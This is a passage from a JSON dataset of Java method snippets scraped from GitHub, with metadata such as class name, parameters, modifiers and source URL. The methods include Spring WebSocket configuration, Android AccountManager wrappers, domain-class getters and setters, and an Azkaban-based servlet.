57722, "method_name": "sameOriginDisabled", "class_name": "WebsocketSecurityConfiguration", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "boolean", "snippet": "    protected boolean sameOriginDisabled() {\n        return true;\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/config/WebsocketSecurityConfiguration.java", "stars": "2", "class_props": {"extends": "AbstractSecurityWebSocketMessageBrokerConfigurer", "implements": null, "modifiers": ["public"]}}, {"id": 57723, "method_name": "getContractId", "class_name": "TariffOptionWebList", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getContractId() {\n        return contractId;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/tariff/option/TariffOptionWebList.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57724, "method_name": "setContractId", "class_name": "TariffOptionWebList", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setContractId(int value) {\n        this.contractId = value;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/tariff/option/TariffOptionWebList.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57725, "method_name": "getDate", "class_name": "TariffOptionWebList", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Date", "snippet": "    public Date getDate() {\n        return date;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/tariff/option/TariffOptionWebList.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57726, "method_name": "setDate", "class_name": "TariffOptionWebList", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDate(Date value) {\n        this.date = value;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/tariff/option/TariffOptionWebList.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57727, "method_name": "getFullOptionList", "class_name": "TariffOptionWebList", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<TariffOption>", "snippet": "    public List<TariffOption> getFullOptionList() {\n        if (fullOptionList == null) {\n            fullOptionList = new ArrayList<TariffOption>();\n        }\n        return this.fullOptionList;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/tariff/option/TariffOptionWebList.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57728, "method_name": "get", "class_name": "AccountManager", "params": ["Context"], "throws": null, "modifiers": ["public", "static"], "return_type": "AccountManager", "snippet": "    public static AccountManager get(Context context) {\n        if (SDK >= 7) {\n            // The AccountManager does not have any bugs in API Level 7,\n            // so always use it to avoid the performance cost of parsing\n            // the manifest for database authenticators.\n            return new StandardAccountManager(context);\n        } else {\n            // Use DatabaseAccountManager for earlier platform versions.\n            // It will use a StandardAccountManager for API Level 5 and 6,\n            // unless there is a DatabaseAuthenticator that has indicated\n            // it should be used instead. DatabaseAuthenticators are always\n            // used on API Level 4 and earlier because StandardAccountManager\n            // is not supported.\n            return new DatabaseAccountManager(context);\n        }\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/AccountManager.java", "stars": "74", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 57729, "method_name": "getAccountsByType", "class_name": "AccountManager", "params": ["String"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "Account", "snippet": "    public abstract Account[] getAccountsByType(String type);\n\n    /**\n     * Mirrors\n     * {@link android.accounts.AccountManager#getAccountsByTypeAndFeatures(String, String[], android.accounts.AccountManagerCallback, Handler)}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/AccountManager.java", "stars": "74", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 57730, "method_name": "getAccountsByTypeAndFeatures", "class_name": "AccountManager", "params": ["String", "String", "AccountManagerCallback<Account>", "Handler"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "AccountManagerFuture<Account>", "snippet": "    public abstract AccountManagerFuture<Account[]> getAccountsByTypeAndFeatures(String type,\n            String[] features, AccountManagerCallback<Account[]> callback, Handler handler);\n\n    /**\n     * Mirrors\n     * {@link android.accounts.AccountManager#addAccount(String, String, String[], Bundle, Activity, android.accounts.AccountManagerCallback, Handler)}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/AccountManager.java", "stars": "74", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 57731, "method_name": "addAccount", "class_name": "AccountManager", "params": ["String", "String", "String", "Bundle", "Void", "AccountManagerCallback<Bundle>", "Handler"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "AccountManagerFuture<Bundle>", "snippet": "    public abstract AccountManagerFuture<Bundle> addAccount(String accountType,\n            String authTokenType, String[] requiredFeatures, Bundle addAccountOptions,\n            Void activity, AccountManagerCallback<Bundle> callback, Handler handler);\n\n    /**\n     * Mirrors\n     * {@link android.accounts.AccountManager#addAccountExplicitly(android.accounts.Account, String, Bundle)}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/AccountManager.java", "stars": "74", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 57732, "method_name": "addAccountExplicitly", "class_name": "AccountManager", "params": ["Account", "String", "Bundle"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "boolean", "snippet": "    public abstract boolean addAccountExplicitly(Account account, String password, Bundle extras);\n\n    /**\n     * Mirrors\n     * {@link android.accounts.AccountManager#removeAccount(android.accounts.Account, android.accounts.AccountManagerCallback, Handler)}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/AccountManager.java", "stars": "74", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 57733, "method_name": "removeAccount", "class_name": "AccountManager", "params": ["Account", "AccountManagerCallback<Boolean>", "Handler"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "AccountManagerFuture<Boolean>", "snippet": "    public abstract AccountManagerFuture<Boolean> removeAccount(Account account,\n            AccountManagerCallback<Boolean> callback, Handler handler);\n\n    /**\n     * Mirrors\n     * {@link android.accounts.AccountManager#getAuthToken(android.accounts.Account, String, boolean, android.accounts.AccountManagerCallback, Handler)}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/AccountManager.java", "stars": "74", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 57734, "method_name": "getAuthToken", "class_name": "AccountManager", "params": ["Account", "String", "boolean", "AccountManagerCallback<Bundle>", "Handler"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "AccountManagerFuture<Bundle>", "snippet": "    public abstract AccountManagerFuture<Bundle> getAuthToken(Account account,\n            String authTokenType, boolean notifyAuthFailure,\n            AccountManagerCallback<Bundle> callback, Handler handler);\n\n    /**\n     * Mirrors\n     * {@link android.accounts.AccountManager#invalidateAuthToken(String, String)}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/AccountManager.java", "stars": "74", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 57735, "method_name": "invalidateAuthToken", "class_name": "AccountManager", "params": ["String", "String"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void invalidateAuthToken(String accountType, String authToken);\n\n    /**\n     * Mirrors\n     * {@link android.accounts.AccountManager#blockingGetAuthToken(android.accounts.Account, String, boolean)}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/AccountManager.java", "stars": "74", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 57736, "method_name": "blockingGetAuthToken", "class_name": "AccountManager", "params": ["Account", "String", "boolean"], "throws": ["AuthenticatorException", "IOException", "OperationCanceledException"], "modifiers": ["final", "public"], "return_type": "String", "snippet": "    public final String blockingGetAuthToken(Account account, String authTokenType,\n            boolean notifyAuthFailure) throws AuthenticatorException, IOException,\n            OperationCanceledException {\n        AccountManagerCallback<Bundle> callback = null;\n        Handler handler = null;\n        Bundle bundle = getAuthToken(account, authTokenType, notifyAuthFailure, callback, handler)\n                .getResult();\n        return bundle.getString(KEY_AUTHTOKEN);\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/AccountManager.java", "stars": "74", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 57737, "method_name": "execute", "class_name": "TaskExecutor", "params": ["Runnable"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void execute(Runnable r) {\n            new Thread(r).start();\n        }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/AccountManager.java", "stars": "74", "class_props": {"extends": null, "implements": ["Executor"], "modifiers": ["static", "private"]}}, {"id": 57738, "method_name": "postRunnableToHandler", "class_name": "BaseFutureTask", "params": ["Runnable"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "        protected void postRunnableToHandler(Runnable runnable) {\n            Handler handler = (mHandler == null) ? mMainHandler : mHandler;\n            handler.post(runnable);\n        }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/AccountManager.java", "stars": "74", "class_props": {"extends": "FutureTask", "implements": null, "modifiers": ["private"]}}, {"id": 57739, "method_name": "startTask", "class_name": "BaseFutureTask", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "        protected void startTask() {\n            new TaskExecutor().execute(this);\n        }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/AccountManager.java", "stars": "74", "class_props": {"extends": "FutureTask", "implements": null, "modifiers": ["private"]}}, {"id": 57740, "method_name": "done", "class_name": "Future2Task", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "        protected void done() {\n            if (mCallback != null) {\n                postRunnableToHandler(new Runnable() {\n                    public void run() {\n                        mCallback.run(Future2Task.this);\n                    }\n                });\n            }\n        }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/AccountManager.java", "stars": "74", "class_props": {"extends": "BaseFutureTask", "implements": ["AccountManagerFuture"], "modifiers": []}}, {"id": 57741, "method_name": "start", "class_name": "Future2Task", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Future2Task<T>", "snippet": "        public Future2Task<T> start() {\n            startTask();\n            return this;\n        }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/AccountManager.java", "stars": "74", "class_props": {"extends": "BaseFutureTask", "implements": ["AccountManagerFuture"], "modifiers": []}}, {"id": 57742, "method_name": "internalGetResult", "class_name": "Future2Task", "params": ["Long", "TimeUnit"], "throws": ["OperationCanceledException", "IOException", "AuthenticatorException"], "modifiers": ["private"], "return_type": "T", "snippet": "        private T internalGetResult(Long timeout, TimeUnit unit) throws OperationCanceledException,\n                IOException, AuthenticatorException {\n            try {\n                if (timeout == null) {\n                    return get();\n                } else {\n                    return get(timeout, unit);\n                }\n            } catch (InterruptedException e) {\n                // fall through and cancel\n            } catch (TimeoutException e) {\n                // fall through and cancel\n            } catch (CancellationException e) {\n                // fall through and cancel\n            } catch (ExecutionException e) {\n                final Throwable cause = e.getCause();\n                if (cause instanceof IOException) {\n                    throw (IOException) cause;\n                } else if (cause instanceof UnsupportedOperationException) {\n                    throw new AuthenticatorException(cause);\n                } else if (cause instanceof AuthenticatorException) {\n                    throw (AuthenticatorException) cause;\n                } else if (cause instanceof RuntimeException) {\n                    throw (RuntimeException) cause;\n                } else if (cause instanceof Error) {\n                    throw (Error) cause;\n                } else {\n                    throw new IllegalStateException(cause);\n                }\n            } finally {\n                boolean mayInterruptIfRunning = true;\n                cancel(mayInterruptIfRunning);\n            }\n            throw new OperationCanceledException();\n        }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/AccountManager.java", "stars": "74", "class_props": {"extends": "BaseFutureTask", "implements": ["AccountManagerFuture"], "modifiers": []}}, {"id": 57743, "method_name": "getResult", "class_name": "Future2Task", "params": [], "throws": ["OperationCanceledException", "IOException", "AuthenticatorException"], "modifiers": ["public"], "return_type": "T", "snippet": "        public T getResult() throws OperationCanceledException, IOException, AuthenticatorException {\n            return internalGetResult(null, null);\n        }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/AccountManager.java", "stars": "74", "class_props": {"extends": "BaseFutureTask", "implements": ["AccountManagerFuture"], "modifiers": []}}, {"id": 57744, "method_name": "getResult", "class_name": "Future2Task", "params": ["long", "TimeUnit"], "throws": ["OperationCanceledException", "IOException", "AuthenticatorException"], "modifiers": ["public"], "return_type": "T", "snippet": "        public T getResult(long timeout, TimeUnit unit) throws OperationCanceledException,\n                IOException, AuthenticatorException {\n            return internalGetResult(timeout, unit);\n        }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/AccountManager.java", "stars": "74", "class_props": {"extends": "BaseFutureTask", "implements": ["AccountManagerFuture"], "modifiers": []}}, {"id": 57745, "method_name": "x", "class_name": "Location", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float x()        { return x; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/galaxy/Location.java", "stars": "74", "class_props": {"extends": null, "implements": ["IMappedObject", "Base", "Serializable"], "modifiers": ["public"]}}, {"id": 57746, "method_name": "x", "class_name": "Location", "params": ["float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void x(float d)  { x = d; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/galaxy/Location.java", "stars": "74", "class_props": {"extends": null, "implements": ["IMappedObject", "Base", "Serializable"], "modifiers": ["public"]}}, {"id": 57747, "method_name": "y", "class_name": "Location", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float y()        { return y;  }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/galaxy/Location.java", "stars": "74", "class_props": {"extends": null, "implements": ["IMappedObject", "Base", "Serializable"], "modifiers": ["public"]}}, {"id": 57748, "method_name": "y", "class_name": "Location", "params": ["float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void y(float d)  { y = d; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/galaxy/Location.java", "stars": "74", "class_props": {"extends": null, "implements": ["IMappedObject", "Base", "Serializable"], "modifiers": ["public"]}}, {"id": 57749, "method_name": "setXY", "class_name": "Location", "params": ["float", "float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setXY(float d1, float d2) {\n        x(d1);\n        y(d2);\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/galaxy/Location.java", "stars": "74", "class_props": {"extends": null, "implements": ["IMappedObject", "Base", "Serializable"], "modifiers": ["public"]}}, {"id": 57750, "method_name": "onAttachedToWindow", "class_name": "Practice08ObjectAnimatorLayout", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onAttachedToWindow() {\n        super.onAttachedToWindow();\n\n        view = (Practice08ObjectAnimatorView) findViewById(R.id.objectAnimatorView);\n        animateBt = (Button) findViewById(R.id.animateBt);\n\n        animateBt.setOnClickListener(new OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                // TODO \u5728\u8fd9\u91cc\u5904\u7406\u70b9\u51fb\u4e8b\u4ef6\uff0c\u7528 ObjectAnimator \u64ad\u653e\u52a8\u753b\n                // 1. \u7528 ObjectAnimator \u521b\u5efa Animator \u5bf9\u8c61\n                // 2. \u7528 start() \u6267\u884c\u52a8\u753b\n                // *. \u8bb0\u5f97\u5728 Practice08ObjectAnimatorView \u4e2d\u4e3a progress \u6dfb\u52a0 setter/ getter \u65b9\u6cd5\uff01\n                ObjectAnimator animator = ObjectAnimator.ofFloat(view, \"progress\", 60f);\n                animator.setDuration(1000);\n                animator.setInterpolator(new FastOutSlowInInterpolator());\n                animator.start();\n            }\n        });\n    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/view/lesson5/practice08/Practice08ObjectAnimatorLayout.java", "stars": "2", "class_props": {"extends": "RelativeLayout", "implements": null, "modifiers": ["public"]}}, {"id": 57751, "method_name": "getId", "class_name": "AttAchDomain", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getId() {\n        return id;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/AttAchDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57752, "method_name": "setId", "class_name": "AttAchDomain", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setId(Integer id) {\n        this.id = id;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/AttAchDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57753, "method_name": "getFname", "class_name": "AttAchDomain", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getFname() {\n        return fname;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/AttAchDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57754, "method_name": "setFname", "class_name": "AttAchDomain", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setFname(String fname) {\n        this.fname = fname;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/AttAchDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57755, "method_name": "getFtype", "class_name": "AttAchDomain", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getFtype() {\n        return ftype;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/AttAchDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57756, "method_name": "setFtype", "class_name": "AttAchDomain", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setFtype(String ftype) {\n        this.ftype = ftype;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/AttAchDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57757, "method_name": "getFkey", "class_name": "AttAchDomain", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getFkey() {\n        return fkey;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/AttAchDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57758, "method_name": "setFkey", "class_name": "AttAchDomain", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setFkey(String fkey) {\n        this.fkey = fkey;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/AttAchDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57759, "method_name": "getAuthorId", "class_name": "AttAchDomain", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getAuthorId() {\n        return authorId;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/AttAchDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57760, "method_name": "setAuthorId", "class_name": "AttAchDomain", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setAuthorId(Integer authorId) {\n        this.authorId = authorId;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/AttAchDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57761, "method_name": "getCreated", "class_name": "AttAchDomain", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getCreated() {\n        return created;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/AttAchDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57762, "method_name": "setCreated", "class_name": "AttAchDomain", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCreated(Integer created) {\n        this.created = created;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/AttAchDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57763, "method_name": "init", "class_name": "UserParamsServlet", "params": ["ServletConfig"], "throws": ["ServletException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void init(final ServletConfig config) throws ServletException {\n        super.init(config);\n        Injector injector = ServiceProvider.SERVICE_PROVIDER.getInjector()\n            .createChildInjector(new UserParamsModule());\n        userParamsService = injector.getInstance(UserParamsService.class);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-user-params/src/main/java/com/webank/wedatasphere/schedulis/userparams/servlet/UserParamsServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 57764, "method_name": "handleGet", "class_name": "UserParamsServlet", "params": ["HttpServletRequest", "HttpServletResponse", "Session"], "throws": ["ServletException", "IOException"], "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void handleGet(final HttpServletRequest req, final HttpServletResponse resp,\n        final Session session) throws ServletException, IOException {\n\n        if (hasParam(req, \"ajax\")) {\n            handleAJAXAction(req, resp, session);\n        } else {\n            handleSystemPage(req, resp, session);\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-user-params/src/main/java/com/webank/wedatasphere/schedulis/userparams/servlet/UserParamsServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 57765, "method_name": "handleAJAXAction", "class_name": "UserParamsServlet", "params": ["HttpServletRequest", "HttpServletResponse", "Session"], "throws": ["ServletException", "IOException"], "modifiers": ["private"], "return_type": "void", "snippet": "    private void handleAJAXAction(final HttpServletRequest req,\n        final HttpServletResponse resp, final Session session) throws ServletException,\n        IOException {\n        final HashMap<String, Object> ret = new HashMap<>();\n        final String ajaxName = getParam(req, \"ajax\");\n\n        if (ajaxName.equals(\"user_role\")) {\n            ajaxGetUserRole(req, resp, session, ret);\n        } else if (ajaxName.equals(\"fetchAllUserVariable\")){\n            ajaxFetchAllUserVariable(req, resp, session, ret);\n        } else if (ajaxName.equals(\"addUserVariable\")){\n            ajaxAddUserVariable(req, resp, session, ret);\n        } else if (ajaxName.equals(\"deleteUserVariable\")){\n            ajaxDeleteUserVariable(req, resp, session, ret);\n        } else if (ajaxName.equals(\"updateUpdateUserVariable\")){\n            ajaxUpdateUpdateUserVariable(req, resp, session, ret);\n        } else if (ajaxName.equals(\"fetchUserVariableById\")){\n            ajaxFetchUserVariableById(req, resp, session, ret);\n        } else if(ajaxName.equals(\"loadWtssUser\")){\n            ajaxLoadWtssUser(req, resp, session, ret);\n        }\n\n        if (ret != null) {\n            this.writeJSON(resp, ret);\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-user-params/src/main/java/com/webank/wedatasphere/schedulis/userparams/servlet/UserParamsServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 57766, "method_name": "ajaxGetUserRole", "class_name": "UserParamsServlet", "params": ["HttpServletRequest", "HttpServletResponse", "Session", "HashMap<String,Object>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void ajaxGetUserRole(final HttpServletRequest req,\n        final HttpServletResponse resp, final Session session, final HashMap<String, Object> ret) {\n        final String[] userRoles = session.getUser().getRoles().toArray(new String[0]);\n        ret.put(\"userRoles\", userRoles);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-user-params/src/main/java/com/webank/wedatasphere/schedulis/userparams/servlet/UserParamsServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 57767, "method_name": "handleSystemPage", "class_name": "UserParamsServlet", "params": ["HttpServletRequest", "HttpServletResponse", "Session"], "throws": ["ServletException"], "modifiers": ["private"], "return_type": "void", "snippet": "    private void handleSystemPage(final HttpServletRequest req, final HttpServletResponse resp, final Session session)\n        throws ServletException {\n        final Page page =\n            newPage(req, resp, session, \"/com.webank.wedatasphere.schedulis.viewer.userparams/userparams-manager.vm\");\n        page.add(\"wtssUser\", session.getUser().getUserId());\n\n        String languageType = LoadJsonUtils.getLanguageType();\n        Map<String, String> viewDataMap;\n        Map<String, String> subPageMap1;\n        if (languageType.equalsIgnoreCase(\"zh_CN\")) {\n            viewDataMap = LoadJsonUtils.transJson(\"/com.webank.wedatasphere.schedulis.i18n.conf/az-webank-user-params-zh_CN.json\",\n                \"com.webank.wedatasphere.schedulis.viewer.userparams.userparams-manager.vm\");\n            subPageMap1 = LoadJsonUtils.transJson(\"/com.webank.wedatasphere.schedulis.i18n.conf/azkaban-web-server-zh_CN.json\",\n                \"azkaban.webapp.servlet.velocity.nav.vm\");\n        }else {\n            viewDataMap = LoadJsonUtils.transJson(\"/com.webank.wedatasphere.schedulis.i18n.conf/az-webank-user-params-en_US.json\",\n                \"com.webank.wedatasphere.schedulis.viewer.userparams.userparams-manager.vm\");\n            subPageMap1 = LoadJsonUtils.transJson(\"/com.webank.wedatasphere.schedulis.i18n.conf/azkaban-web-server-en_US.json\",\n                \"azkaban.webapp.servlet.velocity.nav.vm\");\n        }\n\n        // \u6dfb\u52a0\u56fd\u9645\u5316\u6807\u7b7e\n        viewDataMap.forEach(page::add);\n        subPageMap1.forEach(page::add);\n        page.add(\"currentlangType\", languageType);\n        page.render();\n\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-user-params/src/main/java/com/webank/wedatasphere/schedulis/userparams/servlet/UserParamsServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 57768, "method_name": "loadUserParamsServletI18nData", "class_name": "UserParamsServlet", "params": [], "throws": null, "modifiers": ["private"], "return_type": "Map<String,String>", "snippet": "    private Map<String, String> loadUserParamsServletI18nData() {\n        String languageType = LoadJsonUtils.getLanguageType();\n        Map<String, String> dataMap;\n        if (languageType.equalsIgnoreCase(\"zh_CN\")) {\n            dataMap = LoadJsonUtils.transJson(\"/com.webank.wedatasphere.schedulis.i18n.conf/az-webank-user-params-zh_CN.json\",\n                \"com.webank.wedatasphere.schedulis.userparams.servlet.UserParamsServlet\");\n        }else {\n            dataMap = LoadJsonUtils.transJson(\"/com.webank.wedatasphere.schedulis.i18n.conf/az-webank-user-params-en_US.json\",\n                \"com.webank.wedatasphere.schedulis.userparams.servlet.UserParamsServlet\");\n        }\n        return dataMap;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-user-params/src/main/java/com/webank/wedatasphere/schedulis/userparams/servlet/UserParamsServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 57769, "method_name": "handlePost", "class_name": "UserParamsServlet", "params": ["HttpServletRequest", "HttpServletResponse", "Session"], "throws": ["ServletException", "IOException"], "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void handlePost(final HttpServletRequest req, final HttpServletResponse resp,\n        final Session session) throws ServletException, IOException {\n        if (hasParam(req, \"ajax\")) {\n            handleAJAXAction(req, resp, session);\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-user-params/src/main/java/com/webank/wedatasphere/schedulis/userparams/servlet/UserParamsServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 57770, "method_name": "ajaxFetchAllUserVariable", "class_name": "UserParamsServlet", "params": ["HttpServletRequest", "HttpServletResponse", "Session", "HashMap<String,Object>"], "throws": ["ServletException"], "modifiers": ["private"], "return_type": "void", "snippet": "    private void ajaxFetchAllUserVariable(final HttpServletRequest req, final 